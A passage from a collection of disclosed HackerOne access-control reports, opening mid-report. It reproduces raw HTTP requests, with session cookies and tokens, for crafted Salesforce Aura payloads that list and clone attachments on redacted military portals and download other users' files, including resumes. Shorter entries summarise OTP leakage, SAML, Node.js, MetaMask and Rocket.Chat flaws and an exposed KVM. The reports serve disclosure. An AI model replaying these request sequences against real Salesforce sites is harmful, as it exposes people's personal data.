Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://█████.mil/Portal█████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1310
Origin: https://█████████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```

4. Send the request to Repeater, modify as below and send. This will pull some info from your own Contact record. Save the Contact Id (003Rw000002SJcsIAG in my case)

```
POST /Portal█████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://█████.mil/Portal█████████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1115
Origin: https://██████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```

█████████

5. Modify the request again as below, setting the value of parentId as as your Contact Id extracted in previous step and attachmentId as 00PRw000000MaT3MAK:

```
POST /Portal█████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://███████.mil/Portal███████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 999
Origin: https://███████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"20;a","descriptor":"apex://ExAM.FileUploadController/ACTION$cloneAttachment","callingDescriptor":"markup://ExAM:AssessmentViewer","params":{"attachmentId":"00PRw000000MaT3MAK","parentId":"003Rw000002SJcsIAG"},"version":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal█████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```
█████

6. Modify request again and send, this time calling all accessible Attachment records. Note that a new file has just been cloned/created, copy the Id: 00PRw000000MbSLMA0.

```
POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: ██████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://████████.mil/Portal██████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1118
Origin: https://███.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Attachment","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
```
████████

7. Insert the ID into URL as below (same session) and verify that file is accessible from your account:

https://█████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MbSLMA0


# Notes

To ease testing on your side, I am also attaching a list of Attachment Id's that I generated using the method mentioned in the beginning of the report.

Hope you find this report helpful - look forward to your feedback.

## Suggested Mitigation/Remediation Actions

---

### [Improper Access Controls(Admin Path)](https://hackerone.com/reports/2342461)

- **Report ID:** `2342461`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** MTN Group
- **Reporter:** @aliyueka
- **Bounty:** - usd
- **Disclosed:** 2025-01-31T11:10:22.131Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Go to https://nin.mtn.ng/ then click on "Check your NIN Link Status" then right click and click on "Inpect" and admin path is display at  web browser ../wp-admin/admin-ajax.html

## Steps To Reproduce:
STEP 1:
Go to https://nin.mtn.ng/
{F3021640}

STEP 2:
Click on "Check your NIN Link Status" 
{F3021641}

STEP 3:
Right click at the top of the page(On MTN Yellow Bar) and  then click on "Inspect"
{F3021642}
../wp-admin/admin-ajax.html
Admin Path

## Impact

1.) View Sensitive Information
2.) Steal Customers details
3.) Install backdoor
4.) Access different Components
5.) Alter System

---

### [Worker permission bypass via InternalWorker leak in diagnostics](https://hackerone.com/reports/2575105)

- **Report ID:** `2575105`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Node.js
- **Reporter:** @leodog896
- **Bounty:** - usd
- **Disclosed:** 2025-01-21T18:01:17.845Z
- **CVE(s):** CVE-2025-23083, CVE-2025-23090

**Summary (team):**

With the aid of the diagnostics_channel utility, an event can be hooked into whenever a worker thread is created. This is not limited only to workers but also exposes internal workers, where an instance of them can be fetched, and its constructor can be grabbed and reinstated for malicious usage. 

This vulnerability affects Permission Model users (--permission) on Node.js v20, v22, and v23.

---

### [OTP code Leaked in API Response ](https://hackerone.com/reports/2633888)

- **Report ID:** `2633888`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** MTN Group
- **Reporter:** @tinopreter
- **Bounty:** - usd
- **Disclosed:** 2025-01-08T10:40:34.553Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The application https://corporate.admyntec.co.za allows users to sign up for device insurance. When you Get a Quote, it requires authentication via phone number. An OTP is sent to the phone number to further validate the action was initiated by the legit user. Except this same OTP code is returned in the OTP response.

## Steps To Reproduce:

  1.Vist https://corporate.admyntec.co.za/customerInsurance and get a quote. 
  2. Have a proxy interceptor tool like burpsuite running. Now enter any valid MTN number.
   3. Notice the OTP code is also returned in the API's response

{F3484295}

## Impact

It's possible to sign up with other users accounts. It's possible to log into other users accounts as well.

---

### [Sensitive data exposure: █████████ candidate resumes/CVs available to download with no authentication through BAC/IDOR/Improper Salesforce config](https://hackerone.com/reports/2623715)

- **Report ID:** `2623715`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @oxylis
- **Bounty:** - usd
- **Disclosed:** 2024-12-18T19:48:45.301Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings DoD team,

I located a major example of sensitive data exposure through a BAC/incorrectly configured Salesforce instance.

The https://█████████.experience.███/s/registration page allows the attacker to download any attachment (including thousands of resumes full of PII, university transcripts, and other sensitive files) submitted by other users through the Registration form. Potentially this might also affect files added by the ███████ team manually.

At least several files are available (possibly many more); no authentication is required for this attack.

## Impact

Large-scale data breach/candidate PII leak.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Steps to reproduce:

1. In browser, navigate to: https://███████.experience.██████/s/registration
2. Within Burp, find any POST request to the /aura endpoint, such as below. Send to Repeater:

```
POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
Host: ███████.experience.██████████
Cookie: ████████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://████.experience.███████/s/registration
X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
X-Sfdc-Request-Id: 326100000096dd5c96
X-Sfdc-Page-Cache: eec50ac11c34f2f4
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1555
Origin: https://███.experience.████
Dnt: 1
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2298%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FApexActionController%2FACTION%24execute%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22namespace%22%3A%22%22%2C%22classname%22%3A%22RegistrationCtrl%22%2C%22method%22%3A%22getFileUploadRecord%22%2C%22cacheable%22%3Afalse%2C%22isContinuation%22%3Afalse%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
```

3. Modify the request as follows. This is a specifically crafted Aura payload that returns 2000 ContentDocument records (uploaded files). Send to Repeater and issue request:

```
POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
Host: ███████.experience.██████
Cookie: ██████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://██████.experience.███/s/registration
X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
X-Sfdc-Request-Id: 326100000096dd5c96
X-Sfdc-Page-Cache: eec50ac11c34f2f4
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1554
Origin: https://██████.experience.██████████
Dnt: 1
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
```

4. Extract one of the IDs from the server response, e.g. 069830000028KJdAAM

██████████

5. Insert this ID into URL as below. This will download the attachment (confidential candidate resume) directly. All other files can be accessed using the same method.

https://██████████.experience.██████/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM

# Hope you find this report helpful - look forward to your feedback.

## Suggested Mitigation/Remediation Actions

---

### [Missing Line Terminator on allowedOrigins enables origin spoofing](https://hackerone.com/reports/2585855)

- **Report ID:** `2585855`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** MetaMask
- **Reporter:** @pkkr
- **Bounty:** - usd
- **Disclosed:** 2024-10-29T19:23:59.571Z
- **CVE(s):** -

**Summary (team):**

@pkkr identified a vulnerability in our Snaps `allowedOrigins` functionality, a functionality which allows a Snap developers to control which origins could interact with certain Snaps APIs. Due to a missing regex terminator, this origin control could be bypassed, allowing a malicious domain to access restricted parts of the Snaps API. At its worst, this would enable malicious dApps to call the Keyring API’s `exportAccount` method, potentially accessing sensitive account information from Snaps who choose to implement it.

Not only did @pkkr identify this impactful vulnerability, but did so with incredible timing. His prompt report allowed us to address the issue before it reached production.

We would like to thank @pkkr for his continued efforts to demonstrate the impact of this vulnerability and for consistently helping to make MetaMask more secure.

**Summary (researcher):**

‎

---

### [SAML Signature verification bypass allows logging into any user (with specific conditions)](https://hackerone.com/reports/2579939)

- **Report ID:** `2579939`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** GitHub
- **Reporter:** @ahacker1
- **Bounty:** - usd
- **Disclosed:** 2024-10-10T21:40:22.412Z
- **CVE(s):** CVE-2024-6800

**Summary (team):**

An XML signature wrapping vulnerability was present in GitHub Enterprise Server (GHES) when using SAML authentication with specific identity providers utilizing publicly exposed signed federation metadata XML. This vulnerability allowed an attacker with direct network access to GitHub Enterprise Server to forge a SAML response to provision and/or gain access to a user with site administrator privileges. Exploitation of this vulnerability would allow unauthorized access to the instance without requiring prior authentication. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.14 and was fixed in versions 3.13.3, 3.12.8, 3.11.14, and 3.10.16.
[CVE-2024-6800](https://nvd.nist.gov/vuln/detail/CVE-2024-6800)

---

### [DoD workstation exposed to internet via TinyPilot KVM with no authentication](https://hackerone.com/reports/2633988)

- **Report ID:** `2633988`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @socpuppet
- **Bounty:** - usd
- **Disclosed:** 2024-08-16T16:07:16.879Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
There appears to be a workstation belonging to ███████ (███) that is completely exposed to the internet via IP web interface by way of a TinyPilot KVM device.

TinyPilot KVMs are hardware devices that enable you to remotely access computers via IP address. This device in question is available over the internet without authentication and is connected to a workstation that appears to belong to ███. There is an "UNCLASSIFIED" green banner at the top. In the top right corner appears to be the initials "SA", which may identify the user.

Please see attached screenshot. Of note: I did **not** interact with the device at all. I immediately closed the connection after taking the screenshot attached to file this report. I do not know how long this device has been exposed like this. There appears to be no notification the user when this happens.

## References
Read more about TinyPilot devices here: https://tinypilotkvm.com/

## Impact
Simply by visiting the IP address in question, anyone on the internet can see the users screen and have full mouse/keyboard control over the workstation. An attacker could also sit and watch the user's screen to gain information.

Confidentiality: The user's entire session is exposed. Anything that appears on screen could be seen/watched by an attacker.
Integrity: An attacker could take control of the mouse/keyboard and modify the system in any way.
Availability: An attacker could take control of the mouse/keyboard and destroy files, inhibit the use of the system, etc.

## System Host(s)
████████ (Comcast Cable Communications, LLC - Houston, TX)

## Steps to Reproduce
Visiting https://█████ loads into the TinyPilot KVM service with no authentication and connects you to what appears to be a ███████ workstation.

## Suggested Mitigation/Remediation Actions
Disconnect the workstation from TinyPilot KVM, or insure proper authentication mechanism is in place.

---

### [Guest Privilege Escalation to admin group](https://hackerone.com/reports/501081)

- **Report ID:** `501081`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T22:00:09.452Z
- **CVE(s):** -

**Vulnerability Information:**

Due to improper ACLs it was found possible to escalate privileges from a guest user to admin.

As first step the guest user adds itself to the `bot` group that holds the `manage-own-integrations` permission. With this permission it is possible to create a custom Integration with a script that, if triggered, adds the user to the `admin` group.

The `insertOrUpdateUser` method improperly validates a users permissions to change its groups. Because an explicit check prevents from adding itself to the `admin` group directly, the privileges of the `bot` group need to be used to further escalate to global admin.

## Releases Affected:

  * [develop@5f0180d](https://github.com/RocketChat/Rocket.Chat/commit/5f0180dc1500b4e37b8320b39869babadb5d01cd)

## Steps To Reproduce (from initial installation to vulnerability):

(Add details for how we can reproduce the issue)

  1. Login Guest user
  2. Determine own users `_id` from browser traffic
  3. Escalate to `bot` group
  4. Create malicious Integration script
  5. Trigger Integration

## Supporting Material/References:

### Bot group privilege escalation
```json
